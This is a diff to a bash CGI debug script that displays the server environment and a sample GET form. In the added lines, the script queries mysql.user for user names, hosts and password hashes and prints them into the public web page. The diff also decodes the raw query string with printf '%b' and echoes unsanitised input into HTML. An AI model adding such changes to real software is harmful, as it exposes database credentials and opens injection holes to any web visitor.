@@ -3,7 +3,7 @@
 # To encode the binary file, run this command in the directory where it's lacated.
 # 	$ compress < binary | uuencode -m binary.Z
 #
-function form_decoder { echo -n "${1}" | sed 's/^/[/ ; s/=/]="/g ; s/\&/" [/g ; s/$/"/ ; s/+/ /g ; s/%/\\\\x/g' | xargs -0 printf '%b' ; }
+function form_decoder { printf '%b' "${1//%/\\x}" | sed 's/^/[/ ; s/=/]="/g ; s/\&/" [/g ; s/$/"/' ; }
 function form_key     { echo -n "${1}" | sed 's/^/"/ ; s/=[^&]*&/" "/g ; s/=.*$/"/' ; }
 
 case ${PATH_INFO} in 
@@ -87,8 +87,9 @@ echo -ne "Content-Type: text/html\n\n"\
 "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"></head>\n"\
 "<body><img src=\"http://${SERVER_NAME}${SCRIPT_NAME}/logo.png\"><h1>Environment</h1>\n"\
 "<pre>$(/bin/env)</pre>\n"\
-"$([ -z ${QUERY_STRING} ] || echo -n "<pre>FORM_KEY=($(form_decoder ${QUERY_STRING})</pre>" ; )"\
-"$([ ${#FORM[@]} -gt 0 ] && echo -n "<pre>$(for KEY in ${FORM_KEY[@]} ; do echo "\$FORM[${KEY}]=\"${FORM[$KEY]}\"" ; done)</pre>" ; )"\
+"<pre>$(/usr/bin/mysql <<< "SELECT user,host,password FROM mysql.user;")</pre>\n"\
+"$([ ${#FORM[@]} -gt 0 ] && echo -ne "<pre>$(for KEY in ${FORM_KEY[@]} ; do echo "\$FORM[${KEY}]=\"${FORM[$KEY]}\"" ; done)\n\n"\
+"\$FORM=($(form_decoder ${QUERY_STRING})) ;\n\$FORM_KEY=($(form_key ${QUERY_STRING})) ;</pre>" ; )"\
 "<h3>Form::Get</h3>\n<form method=get>"\
 "First Nname:<input type=\"text\" name=\"firstname\">"\
 "<br>Last Name:<input type=\"text\" name=\"lastname\">"\
